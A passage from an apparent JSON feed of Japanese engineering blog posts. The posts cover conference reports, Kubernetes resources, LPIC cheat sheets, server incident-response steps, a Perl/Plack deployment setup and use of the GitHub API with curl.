PolicyカーネルレベルAZベータ版データセンター障害の回復性ゾーンは3つまで使用可能ゾーンの数に合わせてレプリカ数を設定THR10007 - ITと技術者の将来について語り合うエモい話要点ディスカッション形式コミュニティ参加やアウトプットを重視しているどんどんチャレンジしてスキルをつけていくことが大事メモ今後あるいは10年後どうなる？これからチャレンジしたいことは？MRフリーランス自分の営業をこれからも続けていく自分が何が得意で、何が苦手かアピールブルーオーシャンを探したいコミュニティのエンパワーメント出てこない人にどうやって技術を好きになってもらうか社内コミュニティを作ってもらうお勧めしたいことは？技術を楽しんで、周りに広めていく仲間ができてコミュニティができる人を変えるのは難しい、好きなことを広めることならできる楽しんでる雰囲気を出していると向こうから来てくれる自分の強みを知って、それを発信していく業務で触ってなくてもコミュニティで発表いていたやりたいこと、好きなことを見つけて、人が見える場所に出していく外のコミュニティに参加してみる会社にいるだけではスキルはプロジェクト依存コミュニティの熱量がすごいアウトプットすると強い人がインプットをくれるとりあえず踏み出してみる楽しんだもの勝ちやりたいことを素直にやってみるUNC10013 - Vue.js 3 に向けた Vue.js 入門難易度：初級～中級要点Vue.js の設計思想、V3 でも使える構文、V3 の新機能コンポジッションAPI関数ベースで提供される APIコンポーネントのロジックが綺麗になるV2 でもお試しで使えるブース立ち寄ったブースの中で、興味を持った内容を紹介します。LenovoLenovo ThinkSystem SE350 | レノボジャパン軽量でコンパクトなエッジサーバーWifi、LTE、有線ネットワーク対応Intel製品概要: OpenVINO™ ツールキットエッジでのディープラーニング推論アプリケーション開発学習済みモデルを無料で利用可能インテルCPUに対応PivotalAzure Spring Cloud | Microsoft DocsSpring Boot アプリをクラウドで実行ベータ版のサービスAKS 上にデプロイされる水平スケールやメトリクス、ログの収集が可能AKS は隠蔽されているため、ユーザーからは見えない手軽に導入できるので POC にも適している","link":"https://kyohmizu.hatenablog.com/entry/2019/12/10/012041","isoDate":"2019-12-09T16:20:41.000Z","dateMiliSeconds":1575908441000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"Zero Scale Abstraction in Knative Serving - Part1","contentSnippet":"Serverless Days Tokyo 2019 の Zero Scale Abstraction in Knative Serving というセッションの内容を書き起こしたものです。スピーカー…","link":"https://qiita.com/toVersus/items/9fa635e9cf57643f8dd6","isoDate":"2019-10-23T13:20:58.000Z","dateMiliSeconds":1571836858000,"authorName":"Tsubasa Nagasawa","authorId":"toVersus"},{"title":"LPIC 102 チートシート","contentSnippet":"試験前の確認事項としてまとめた内容です。環境変数ロケールディレクトリ・ファイル文字コードIPアドレスのクラスプライベートアドレスポート変数envsetshellのオプションエ…","link":"https://qiita.com/kyohmizu/items/d5d6fedc527efa9f649c","isoDate":"2019-10-09T01:56:54.000Z","dateMiliSeconds":1570586214000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"LPIC 101チートシート","contentSnippet":"試験前の確認事項としてまとめた内容です。環境変数デバイスファイルファイルシステムディレクトリ・ファイルsystemdのユニットvi正規表現dpkg設定ファイル  /etc/dpkg/…","link":"https://qiita.com/kyohmizu/items/923844999018fd456d44","isoDate":"2019-10-09T01:48:33.000Z","dateMiliSeconds":1570585713000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"de:code 2019 参加レポート","contentSnippet":"Microsoft主催のテクニカルカンファレンス「de:code 2019」に参加してきました。www.microsoft.com参加セッション1日目コンテナ技術を中心にセッションを選択【KN01】基調講演【CD06】しくみがわかる Azure Kubernetes Service (AKS) ～開発者目線で Kubernetes の基本を理解する～【CD01】Windows Containers と Azure による、既存 .NET アプリケーションのモダナイゼーション【CD91】HashiCorp Terraform Azure Provider チュートリアル【CD12】マネージド Kubernetes ガチ本番運用 in ZOZOTOWNwww.youtube.com2日目コンテナ・セキュリティのセッションを選択【SE07】脆弱性はなぜ生まれ、どのように攻撃されるのか? 安全なアプリを開発、運用するためのきほん【CD93】コンテナ環境の永続化ストレージ問題を NetApp Kubernetes Service と Azure NetApp Files でさらっと解決【CM12】.NET Core マルチ プラットフォームの本質【SE05】もうセキュリティはやりたくない!! 第 3 弾 ～Azure Sentinel Deep Dive～注目技術参加したセッションの中で、特に印象に残った or 関心のある技術を取り上げます。Azure Kubernetes Service(AKS)Azureのマネージド Kubernetes サービスである AKS ですが、導入事例が増えてきているそうです。ノロジーズをはじめ、いくつかの企業が自社の導入について講演していました。Kubernetes に概要や操作に関しては特筆することはありませんでしたが、Azure関連の技術として以下に興味を持ちました。Kubernetes-based Event-driven Autoscaling(KEDA)Microsoft と Red Hatが共同作成したプロジェクト。イベント駆動でコンテナのオートスケールを実現します。GitHub - kedacore/keda: KEDA is a Kubernetes-based Event Driven Autoscaling component. It provides event driven scale for any container running in KubernetesVirtual Kubeletkubelet のように動作し、Kubernetes と他のAPIを接続する役割を果たすもの。VM と同じように Kubernetes クラスタで一元管理できます。GitHub - virtual-kubelet/virtual-kubelet: Virtual Kubelet is an open source Kubernetes kubelet implementation.Windows コンテナサポートWindows Server Node が、Kubernetes クラスタで Linux Node と同時に管理できるようになりました。AKS では Multiple Node Pool を使用することで Windows Server Node を作成できます。チュートリアルを試しましたが、なぜかクラスタ作成に失敗)Windows containers now supported in Kubernetes - Open Source blogAzure NetApp FilesNetApp 社の高速ストレージサービス。SSD 並みの速度が出るそうで、Kubernetes の永続化ボリュームとして有用だと思います。また NetApp Kubernetes Service という Kubernetes 管理サービスも提供しているようです。(Rancher みたいなもの？)Azure NetApp Files documentation | Microsoft DocsAzure SentinelAI を使用した高機能なセキュリティサービス。Azure Sentinel | Microsoft Azureその他Azure DevOpsAzure PiplineApp ServiceService FabricWSL2感想Azureに関連したテーマのセッションがほとんどでした。クラウドサービスは以前に比べ使いやすくなっていて、機能も充実してきた印象です。AKS、AzureADの動向は今後も注目していこうと思います。LT資料社内勉強会で de:code の recap を発表しました。    Recap of de code 2019  from Kyohei Mizumoto www.slideshare.netおまけ2日間のお昼のお弁当です。1日目2日目","link":"https://kyohmizu.hatenablog.com/entry/2019/06/06/111805","isoDate":"2019-06-06T02:18:05.000Z","dateMiliSeconds":1559787485000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"Kubernetesリンク集","contentSnippet":"Kubernetes関連の役立つリンクを記載します。公式リファレンスReference - KubernetesKubectl Reference DocsPhippy and Friends - Cloud Native Computing FoundationGitHubGitHub - kubernetes/kubernetes: Production-Grade Container Scheduling and ManagementGitHub - kelseyhightower/kubernetes-the-hard-way: Bootstrap Kubernetes the hard way on Google Cloud Platform. No scripts.GitHub - jamiehannaford/what-happens-when-k8s: \uD83E\uDD14 What happens when I type kubectl run?プロダクトGoogle Kubernetes Engine documentation \xa0|\xa0 Kubernetes Engine \xa0|\xa0 Google CloudAzure Kubernetes Service (AKS) Documentation - Tutorials, API Reference | Microsoft DocsWhat Is Amazon EKS? - Amazon EKSDocumentation | Rancher LabsK3s: Kightweight KubernetesPivotal Container Service (PKS) | Pivotalスライド、ブログ等Kubernetes のソースコードとの付き合い方 #gounco / Kubernetes source code reading - Speaker DeckKubernetes Patterns : Capacity PlanningKubeWeekly - QiitaKubernetesのユーザー管理と認証・権限確認機構を理解しよう | さくらのナレッジ書籍Kubernetes完全ガイド - インプレスブックス","link":"https://kyohmizu.hatenablog.com/entry/2019/05/28/115504","isoDate":"2019-05-28T02:55:04.000Z","dateMiliSeconds":1559012104000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"【20日チャレンジ】LinuxコマンドをGoで実装","contentSnippet":"Go言語の学習のため、LinuxコマンドをGoで実装します。\\r目的\\r\\rGo言語に慣れる\\r標準パッケージの機能、使い方を知る\\r\\rルール\\r以下のルールでチャレンジを行います。\\r\\r1日1コマンドを実装する\\r最低限、コマンドの基本的な動作(オプションなしの実行など)を行えるようにする\\r余裕があれば追加機能を実装する\\rコマンド名は\\"my\\" + \\"Linuxコマンド名\\"とする\\r極力標準パッケージを使用する\\r\\rソースコード\\rソースコードはGithubで管理します。\\rhttps://github.com/kyohmizu/go-cli-tools\\rスケジュール\\r\\r\\r\\rNo\\r日付\\rコマンド\\r基本実装\\rオプション\\r学習内容\\r\\r\\r1\\r5/23\\rmyls\\r〇\\r\xa0\\r\\rディレクトリ操作\\rエラー処理\xa0\\r\\r\\r\\r2\\r5/24\\rmycp\\r〇\\r△\\rファイル操作\\r\\r\\r3\\r5/25\\rmymv\\r〇\\r△\\r\xa0\\r\\r\\r4\\r5/26\\rmyrm\\r〇\\r△\\r\xa0\\r\\r\\r5\\r5/27\\rmycat\\r〇\\r△\\r\xa0\\r\\r\\r6\\r5/28\\rmycurl\\r〇\\r△\\r\\rhttp接続の実装\\rオプションの複数回指定\\r\\r\\r\\r7\\r5/29\\rmypwd\\r〇\\r△\\r\xa0OSによる条件分岐\\r\\r\\r8\\r5/30\\rmytouch\\r〇\\r△\\rbuild tagの設定\xa0\\r\\r\\r9\\r5/31\\rmymkdir\\r〇\\r△\\r\xa0ファイルの操作権限\\r\\r\\r10\\r6/1\\rmykill\\r〇\\r〇\\rプロセスとシグナル\xa0\\r\\r\\r11\\r6/2\\rmyecho\\r〇\\r-\\r引数の取得\\r\\r\\r12\\r6/3\\rmytime\\r△\\r-\\r\\rコマンド実行\\rtimeの操作\\r\\r\\r\\r13\\r6/4\\rmychmod\\r△\\r-\\r\\rbit演算\\rファイルの権限\\r\\r\\r\\r14\\r6/5\\rmyyes\\r〇\\r〇\\r\xa0\\r\\r\\r15\\r6/6\\rmyenv\\r〇\\r△\\r\\rwindowsで確認不可\\r\\r\\r\\r16\\r6/7\\rmychown\\r〇\\r△\\r\\ruser,group操作\\rwindowsで確認不可\\r\\r\\r\\r17\\r6/8\\rmygrep\\r〇\\r△\\r\\rgrepの操作\\rgoの正規表現\\r\\r\\r\\r18\\r6/9\\rmysleep\\r〇\\r△\\r\xa0\\r\\r\\r19\\r6/10\\rmymkdir\\r〇\\r△\\r\xa0\\r\\r\\r20\\r6/11\\rmyln\\r〇\\r△\\rリンクの操作\\r\\r\\r\\r\xa0\\r成果\\r\\rGoの構文や記法に慣れてきた\\rGo標準パッケージの使い方、調べ方を覚えた\\rLinuxコマンドの動作を知ることができた\xa0\\r\\r感想\\r20日も書けば、ある程度書けるようになることがわかりました。\\r普段使用するC#とGoが似ている点も覚えやすかったのだと思います。\\r次はGoでAPIを作成してみようと考えています。","link":"https://kyohmizu.hatenablog.com/entry/2019/05/23/172119","isoDate":"2019-05-23T08:21:19.000Z","dateMiliSeconds":1558599679000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"Istioが作るサービスメッシュ~サンプルアプリのデプロイ~","contentSnippet":"サンプルアプリ題材: BookInfo アプリケーション※ 事前にIstioをKubernetesにデプロイしておいてください．構成サンプルアプリのデプロイistio-1.0.6 dire…","link":"https://qiita.com/tozastation/items/1f3c3f213b42e1689406","isoDate":"2019-03-14T05:18:21.000Z","dateMiliSeconds":1552540701000,"authorName":"tozastation","authorId":"tozastation"},{"title":"2018年振り返りと、2019年の目標","contentSnippet":"2018年5月末から、エンジニアリングに関する様々な活動を行ってきました。\\r1年の終わりにそれらの活動をまとめ、2019年の目標を記したいと思います。\\r\\r2018年の活動\\r2018年は積極的に新しい技術へチャレンジし、勉強会を通して素晴らしい方々に出会うことができました。\\r新たに触れた技術・ツール\\r\\rGitHub\\rNode.js\\rAngular\\rGolang\\rCentOS\\rDocker\\rKubernetes\\rAzure\\rGCP\\rOWASP ZAP\\rLINE BOT/Clova\\rAgile\\rペアプログラミング/モブプログラミング\\r\\r勉強会・カンファレンス\\r\\rLINE Developer Meetup\\rde:code 2018\\rAzureもくもく会\\rng-japan 2018\\rSQL Server 2017勉強会\\rInteract 2018\\rCCSE 2018\\rThink Japan IBM Code Day\\rJXUG Xamarinハンズオン\\rCosmos DBハンズオン\\rくじらや Dockerハンズオン\\rLINE Clovaスキル開発ハンズオン\\rLINE BOOT AWARDS 2018 ハッカソン\\rGDG DevFest Tokyo 2018\\rXP祭り\\rAzureML勉強会\\rBIT VALLEY 2018\\r.NET Conf 2018\\rContainer SIG Meet-up\\rテスト管理を語る夕べ\\rAVTOKYO\\rアジャイル相談室\\rOSSセキュリティ技術の会\\rJapan Container Days\\r\\r※Japan Container Daysはスタッフとして参加させてもらいました。\\r書籍\\r読了\\r\\r徹底攻略 データベーススペシャリスト教科書\\r徹底攻略 ネットワークスペシャリスト教科書\\rショートコードプログラミング 第3版\\r新装版 達人プログラマー\\rSQLアンチパターン\\rインフラエンジニアの教科書2\\rプログラマのためのDocker教科書 第2版\\rDocker/Kubernetes 実践コンテナ開発入門\\r\\r読みかけ\\r\\r体系的に学ぶ 安全なWebアプリケーションの作り方 第2版\\r\\r社内の活動\\r\\r技術交流、コミュニケーション促進のためチャンネルを開設\\r社内勉強会を主催\\rモブプログラミング・ペアプログラミングを開始\\r\\r資格\\r合格\\r\\rデータベーススペシャリスト\\r\\r不合格\\r\\rネットワークスペシャリスト\\r\\r午後Ⅰが1点足りず…\\rその他\\r\\rはてなブログを開設\\rQiitaアドベントカレンダーに参加\\r\\r2019年の目標\\r7ヶ月間の活動の中で、様々な技術分野にチャレンジした結果、インフラ・セキュリティへの関心が強いことがわかりました。\\r2019年はContainerを中心にインフラのスキルを身に着け、セキュリティ分野の知見を広めていきます。\\r書籍\\r\\r体系的に学ぶ 安全なWebアプリケーションの作り方 第2版\\rKubernetes完全ガイド\\rハッカーの学校\\rテスト駆動開発\\r徹底マスター JavaScriptの教科書\\rドメイン駆動設計\\rハッキング・ラボのつくりかた\\r\\r資格\\r\\rLPIC Level1\\r情報処理安全確保支援士\\rネットワークスペシャリスト","link":"https://kyohmizu.hatenablog.com/entry/2018/12/31/231740","isoDate":"2018-12-31T14:17:40.000Z","dateMiliSeconds":1546265860000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"モバイルファクトリーのインフラアーキテクチャというアドベントカレンダー書いてました","contentSnippet":"ちょっと過去の話ですが、会社の技術ブログで書いてました。tech.mobilefactory.jp","link":"https://blog.masasuzu.net/entry/2018/12/22/000000","isoDate":"2018-12-21T15:00:00.000Z","dateMiliSeconds":1545404400000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"kubernetesにあるIngress Controller�の一覧を挙げてみる","contentSnippet":"はじめにIngress ControllerはL7 Load Balancerの機能を果たすものであり、Ingressリソースはそのルールを定義したものです。このIngress Controlle…","link":"https://qiita.com/skikkh/items/c59de1f5e188d0bbeb35","isoDate":"2018-12-17T14:21:33.000Z","dateMiliSeconds":1545056493000,"authorName":"skikkh","authorId":"skikkh"},{"title":"日本語でvimのfを使う","contentSnippet":"fvimではf, F, t, Tを使うことで、瞬時に目的の文字上にカーソルを移動することができます。動作faでカーソルから右側の方向の１番近い「a」の位置に移動することができます。3faでカ…","link":"https://qiita.com/atsuya0/items/d90bb3f4b8e538c028a9","isoDate":"2018-12-04T06:03:39.000Z","dateMiliSeconds":1543903419000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"[Docker] awslogs-datetime-format の指定方法に注意","contentSnippet":"[Docker] awslogs-datetime-format の指定方法に注意背景Dockerの awslogs ログドライバでは，awslogs-datetime-format オプション…","link":"https://qiita.com/toshikish/items/59a3a4426930e29f0673","isoDate":"2018-11-07T03:23:50.000Z","dateMiliSeconds":1541561030000,"authorName":"toshikish","authorId":"toshikish"},{"title":"ローカル環境でAnsibleの鍵交換がめんどくさい貴方に送るプラクティス","contentSnippet":"はじめに平成の時分も終わりに近づく中、野分立ち尽くす天災に人々は翻弄され、お家で過ごすのを余儀なくされる日が多いように思います。^1今日のような一日は、自然とQiitaにたどり着き、PVが増…","link":"https://qiita.com/skikkh/items/ca236c512d314691b35c","isoDate":"2018-09-30T09:33:37.000Z","dateMiliSeconds":1538300017000,"authorName":"skikkh","authorId":"skikkh"},{"title":"新人が学ぶAnsibleもくもく会 ネットワーク編 報告会","contentSnippet":"はじめにお久しぶりのエントリになります。新卒でインフラエンジニアをしている小心者のひよこです。このような職種に身をおいてはや5ヶ月というところで、世の中を幅広く見渡してみると、どうやら世は大…","link":"https://qiita.com/skikkh/items/156c677e07ffc6b5b4ef","isoDate":"2018-08-29T14:34:09.000Z","dateMiliSeconds":1535553249000,"authorName":"skikkh","authorId":"skikkh"},{"title":"[Laravel] バリデーションデータに前処理したい","contentSnippet":"[Laravel] バリデーションデータに前処理したい当てはまるケースフォーム入力データとデータベース保存データの形式が違う．例えば…全角・半角変換先頭・末尾の空白を取り除くユーザーには0…","link":"https://qiita.com/toshikish/items/f38b691adbebd7ba7720","isoDate":"2018-06-12T09:27:45.000Z","dateMiliSeconds":1528795665000,"authorName":"toshikish","authorId":"toshikish"},{"title":"Git リポジトリを分割する","contentSnippet":"以下のようなディレクトリ構造のリポジトリを分割する方法を場合分けしてまとめます。repo1/ ├─ subdir/ ├─ aaa ├─ bbb ├─ ccc └─ dddケース1：サブディレクト…","link":"https://qiita.com/toshikish/items/3529f75c511a65723798","isoDate":"2018-04-11T10:14:22.000Z","dateMiliSeconds":1523441662000,"authorName":"toshikish","authorId":"toshikish"},{"title":"障碍対応と私","contentSnippet":"この記事は、モバイルファクトリー Advent Calendar 2015 18日目の記事です昨日は@yashims85さんのAndroid drawableは画像を入れておくだけじゃないでした。今日は障碍の話です。普段障碍対応しているときにやってること考えてることをざっくりと時系列を追って書いていきたいと思います。コンテキストとしてはLinuxサーバでwebサービスをやっていると思っていただければと思います。障碍の検知webサービスを運営していれば、何かしらの監視システムからSlackなりIRCなりメールなり電話なりでアラートの通知が来ると思います。対応報告障碍対応をしている旨をメールなり、何かの連絡手段で伝えます。同じく見ている人がいれば調査作業の分担もできます。状況把握どこで障碍?アラートの通知内容にどのサーバで何が起きた的なことが書いてあるはずなので、それを確認します。だいたいの組織に於いてはサーバ管理表的なものがwebなりExcelなり設定ファイルなりにあるはずなので、そこと照らし合わせてどのプロジェクトのどのロールなのかを把握します。直前に何をした? いつもと違うことは何?webアプリケーションであれば直前に入れた変更が原因かもしれません。また、ちょっと前に入れていた変更だが、cronで時限発火したというケースも考えられるかも知れません。イベント開始で急にトラフィックが上がったと言うことも考えられるかも知れません。普段と変わったことは何かということが把握出来れば対処の幅が広がります。影響範囲は?サービス全体なのか、サービスの1機能の障碍なのか、ミドルウェア障碍なのか、影響がどの範囲に及んでいるのかを見ます。ミドルウェア障碍であれば、最近であれば、冗長化されてるのが普通なので、サービスから切り離して、監視から外せば終わりというパターンも多いです。サービス全体が落ちている場合は、ひとまず重要な関係者に状況の1次連絡すぐにした方が良いでしょう。接続出来る?そもそも、該当サーバに接続出来ない場合は、できることはほぼないので、該当サーバをサービスから外した上で、監視対象から外します。(単体のサーバ障碍の場合)# pingは通る?ping ${IP}# sshできる?ssh ${IP}ログの確認該当サーバ上で動いているミドルウェアやアプリケーションサーバのエラーログを主に見ます。だいたいこの辺に重要な情報が出力されている可能性があります。システムのログも確認した方が良いです。主にsyslogやkernelログを見ると良いでしょう。# syslogを見るless /var/log/syslog# kernelログを見るless /var/log/kern.log# kernelログを見る2dmesgサーバ状態の確認負荷の関係で障碍が起きているのであれば、現在のサーバの状態を確認しましょう。以下のようなコマンドが現状把握に役立つでしょう。# loadaverageおよびログイン中のユーザを見るw# 変なプロセス無いか見るps -ef# orps auxwwww# 開いているポートを確認するnetstat -tlnp# ネットワークコネクションを確認するnetstat -taopen# なにかCPU使いまくってないか見るtop# 現在の負荷の経過を見るdstat -tamsl 5# 過去の負荷情報を見る## CPUsar## memorysar -r## lasar -q対処直前のコミットにバグを入れ込んでしまったのであればリバートすれば解決するでしょうし、特定のサーバ落ちたのであれば、サービスから外してあげるだけで良いかも知れません。障碍の内容によって対処方法は様々です。ここで気を付けたいのは二次災害を起こさないことです。可能であれば、コマンドなり対処スクリプトのレビューをしてもらったり、現状認識に間違いがないかを周りの人にしてもらうと良いでしょう。(往々にして一人で障碍対応せざるを得ない場合もありますが。。)事後報告障碍対応が終わったら、記憶が新鮮なうちに下記の内容をまとめてしかるべき場所に投稿します。この辺の報告のフォーマットはだいたいの組織において決まっていることが多いでしょう。障碍内容影響範囲経過対処方法将来の対策面倒くさがらずに事実をなるべく詳細に書いておくと未来の自分や自組織のためになると思います。私の組織でも過去の障碍報告がだいぶ良い感じにデータベースになっており、たまに読み返すと気付きが得られます。また、この障碍報告を元に、同種の障碍をなるべく起こさない仕組み作りをしていくことが肝要だと思います。終わりに自分が障碍対応しているときにやってること、考えてることをざっくり書いてきました。誰にやり方を教わったわけでもないので、そこは違うとかこうした方がいいとかあれば、いただけると幸いです。明日は、@lycoris102さんのGameJam部 活動年間活動報告です。きっと面白い話なのではないでしょうか。","link":"https://blog.masasuzu.net/entry/2015/12/18/troubleshooting","isoDate":"2015-12-18T13:00:00.000Z","dateMiliSeconds":1450443600000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"#chibapm Chiba.pm#7に参加しました。","contentSnippet":"参加しました。雑なスライドですみません。スライド中に出てきてるやつはどれも五反田のお店で出てきます。五反田企業のガイアックスさんとかモバイルファクトリーさんはPerlの会社なので、美味しいごはんを食べたい人は検討してみてはいかがでしょうか。そういえば、Chiba.pmの開催回数がKichijoji.pm、Gotanda.pmに抜かされそうです。。","link":"https://blog.masasuzu.net/entry/2015/12/12/chiba.pm-7","isoDate":"2015-12-12T09:39:37.000Z","dateMiliSeconds":1449913177000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"Plack/PSGIなwebアプリケーションの実行環境","contentSnippet":"この記事は、モバイルファクトリー Advent Calendar 2015 11日目の記事です※ 投稿内容は私個人の意見であり、所属企業・部門見解ならびに技術戦略を代表するものではありません。昨日は@rymizukiさんのnpmライブラリの運用と管理についてでした。今日はPerlの話です。お仕事やプライベートでPerlのwebアプリケーションを書くことが多く、いろいろ知見が溜まってきてるので、ここで少し紹介しようと思います。今回はPlack/PSGIなwebアプリケーションの実行環境の話です。mod_perlなアプリケーションとはちょっとコンテキストが違います。少しかっちりコンテキストに近いです。個人で軽くwebアプリケーション立てるならもう少しゆるふわでも問題ないはずです。OSUbuntuのLTSを使うことが多いです。Ubuntu前提の内容が後に続きます。PerlSystem Perlは使ってません。OS/ディストリビューションが変わってもなるべくそのまま動くようにしたいためです。perl-buildで独自ビルドしたPerlを使います。インストール場所としては、 /usr/local/perl/perl-5.${VERSION} に置きます。Perlを独自ビルドしたものをDebian package化して実行環境にはインストールします。他の方法としては、ビルド済みのperlをtarで固めて、配布するというのもあります。どちらでも構わないのですが、ローカルネットワークにaptサーバ立てている関係で、Debian packageの方が運用しやすいのです。また、perlのマイナーバージョンアップの際もDebian packageを作り直した上で、 apt-get upgrade (or aptitude safe-upgrade)で完結するので、aptの操作に慣れていて楽というのもあります。モジュール管理今風にcpanfileでモジュール管理してます。モジュールインストールはCartonを使ってます。Cartonの後継でCarmelも開発されてます。個人的にはそろそろ触っておきたいところです。また、cpanfile.snapshotもレポジトリに入れています。一般的なモジュールは特定の(古い)バージョンに依存せずに動くべきですが、依存モジュールのバージョン違いによって現在動いているアプリケーションが壊れるのを防ぐために、バージョン固定します。cpanfile.snapshotがある状態で下記のように carton install してあげると、どの環境でも同じバージョンのモジュールがインストールされます。carton install --deployment --without develop,test今やってないですが、別方法としては、モジュールがインストール済みの状態で、 carton bundle すると vendar/ にモジュールのtarが固められるので、それもレポジトリ管理した上で、下記の様にインストールするという手もあります。インストールの際は vendor/bin/carton  にfatpackされたcartonコマンドが入るのでそれを使います。(アプリ実行環境にcartonを敢えて入れる必要は無い)# 依存モジュールを固めるcarton bundle# インストール# env.shは後述./script/env.sh vendor/bin/carton install --cached --deployment --without develop,testさらに別方法としては、ビルドサーバで依存モジュールをビルドした上で、ディレクトリごと実行環境にrsyncしてあげる方法です。ビルドサーバを運用しているならば、この方法でも良いでしょう。参照Carton考2014carton bundle && carton install --cachedの使いどころ独自モジュールなるべく、独自モジュールは使わない方が良いのですが、個人的な事情などで、CPANに公開出来ないモジュールに関しては、OrePAN2 でDarkpanを作ってそこからローカルに配信するようにしてます。OrePAN2のサーバを簡単に立ち上げられるOrePAN2::Serverがありますが、一時期は使っていましたが、モジュールのアップロード機能は別にいらないなどの理由で今はwebサーバから静的配信してます。環境変数プロジェクトのレポジトリに config/env.rc という名前で、アプリケーションを動かすために必要な環境変数を定義したファイルを作ります。PERL5_VERSION=\\"22\\"export PROJECT_BASE=\\"/path/to/project\\"export PERL_CARTON_MIRROR=\\"http://orepan.local/\\"export PERL5LIB=\\"${PROJECT_BASE}/local/lib/perl5:${PROJECT_BASE}/lib\\"export PATH=\\"${PROJECT_BASE}/local/bin:/usr/local/perl/perl-5.${PERL5_VERSION}/bin:${PATH}\\"export PLACK_PORT=5555また、 script/env.sh という名前で config/env.rc を読み込んだ上で、プログラムを実行するラッパースクリプトを作ります。スクリプトなどは基本的にこれを通して実行します。#!/bin/bash -ue# 諸々環境変数を設定した上でコマンドを実行する君##       env.sh perl hogehoge.pl#source /path/to/project/config/env.rcexec \\"$@\\"開発環境で、いちいちラッパースクリプト通すのが面倒な場合は、config/env.rc のsymlinkをプロジェクトルートに .envrc として張った上で、direnv使って済ましてしまう場合もあります。web サーバ起動スクリプトpsgiファイルを plackup するのではなく、こんな感じのスクリプトをscript/web みたいな名前で 用意してアプリケーションサーバを起動するようにしてます。#!/usr/bin/env perluse strict;use warnings;use lib \\"$ENV{PROJECT_BASE}/lib\\";use Plack::Loader;use SomeApplication::Config;use SomeApplication::Web::Handler;my $config = SomeApplication::Config->load();my $app    = SomeApplication::Web->to_app();Plack::Loader->load(    $config->{psgi}->{server},    %{ $config->{psgi}->{config} },)->run($app);また、このスクリプトをstart_serverを経由して起動することで、(graceful restartによる)ホットデプロイをできるようにしてます。start_server のプロセスにSIGHUPを送ると子プロセスのアプリケーションサーバを再起動してくれるのですが、 plackup コマンドで起動してると start_server に渡した引数をそのまま使ってplackup を再起動するので、 max_workers の数を変えたいときなど、 start_server 自体のプロセスを再起動しなくてはならないので不便です。なので、起動スクリプトを作ってます。そのほかにも理由があるのですが、参照リンクに詳しくあります。サーバ実装としては、StarletやGazelleを使ってます。参照PSGI/Plackアプリケーションの起動方法いろいろと本番環境アレコレ普通に使う Plack/PSGI ServerGraduate from .psgiデーモン管理現在はUpstartでアプリケーションサーバのデーモン管理してます。以下の理由で、個人的には好きでした(過去形)。最新のUbuntuはSystemdに変わってしまったので、将来的にはSystemdに移行することになるでしょう。Ubuntuに標準で入っていてサーバ起動時の自動起動してくれてデーモン異常終了時に自動再起動してくれて設定はわりかしわかりやすい/etc/init/web-some-application.conf みたいな名前でこんな設定ファイルを作りますdescription \'some web application\'author \'masasuzu <hogehoge@masasuzu.net>\'start on runlevel [2345]stop on starting rc RUNLEVEL=[016]setuid webappsetgid webapp# 異常時に再起動するrespawnscript    . /path/to/project/config/env.rc    export PLACK_ENV=\\"production\\"    exec ${PROJECT_BASE}/local/bin/start_server \\\\        --interval 10           \\\\        --port ${PLACK_PORT}    \\\\        -- ${PROJECT_BASE}/script/service/webend script上記のファイルを作ると以下のように操作出来ます。reloadでSIGHUPが送れるので、アプリケーションサーバのstart_server経由のgraceful restartができます。# 起動service web-some-application start# 停止service web-some-application stop# (start_serverのプロセスごと)再起動service web-some-application restart# Plackサーバを再起動service web-some-application reloadアプリケーションサーバ以外も、ジョブのワーカーなども、独自に設定ファイルを作って、Upstart経由で起動したりしてます。Upstart以外の選択肢としては、先に挙げたSystemdの他、以下のものがあるでしょう。好みと要件に合わせて使えば良いと思います。daemontoolsSuvpervisordSystemd参照Server::Starterから学ぶhot deployの仕組みServer::Starter の --interval オプションは大切Upstart を使ってお手軽 daemon 化Upstart Intro, Cookbook and Best PractisesおわりにWAF(Web Application Framework)やログの話など膨らまそうと思えばもっと膨らませられますが、実行環境の話なので、ここまでで抑えておきます。ざっくりと、Plack/PSGIなアプリケーションの実行環境について説明してきました。PerlでWebアプリケーションを作る時に何か参考になれば幸いです。また、もっと良い方法があれば、教えていただけるとありがたいです。明日は、@nekobato さんです webpackのなにか面白い話があるんじゃないかとわくどきしてます。","link":"https://blog.masasuzu.net/entry/2015/12/11/plack-psgi-exec-env","isoDate":"2015-12-11T04:30:00.000Z","dateMiliSeconds":1449808200000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"Github APIを使おう","contentSnippet":"この記事は、モバイルファクトリー Advent Calendar 2015 4日目の記事です今日は、Github APIの話です。Githubの管理作業は他のWebサービスと同じく基本Webコンソールでできます。ただ、Organizationとかを管理してる場合、ある程度以上規模が大きくなると、定型的な管理作業が増えて、Webでぽちぽちやるには煩雑でつらくなってきます。ここで怠惰エンジニア*1はどうにかこの定型作業を自動化/スクリプト化できないかなと考え始めます。幸い、GithubにはAPIがあるので、これを利用して要件に合わせて、実装することができます。ドキュメントは以下の場所にあるので、各APIの使い方などはそちらを参照してください。GitHub API v3 | GitHub Developer Guideapiアクセスを投げるpublicな情報を取得するには普通にcurlでGET発行するだけで、取得出来ます。curl https://api.github.com/users/masasuzu/reposが、これだけでは、privateな情報にアクセスできません。ので、Basic認証をしてアクセスをします。curl -u ${USER}:${PASSWORD} https://api.github.com/orgs/some_privete/reposただ、この場合、このアカウントで出来ることが全て実行出来てしまうので、下記のリンクからアクセストークンを発行して、権限を絞ってAPIにアクセスするのが望ましいです。アクセストークンは作成時にしか見れないので、ちゃんと書き留めておくようにしましょう。Personal access tokensアクセストークンを使用した場合、下記の3つの方法で認証出来ます。curl -u :${ACCESS_TOKEN} https://api.github.com/orgs/some_privete/reposcurl -H \'Authorization: token ${ACCESS_TOKEN}\' https://api.github.com/orgs/some_privete/reposcurl 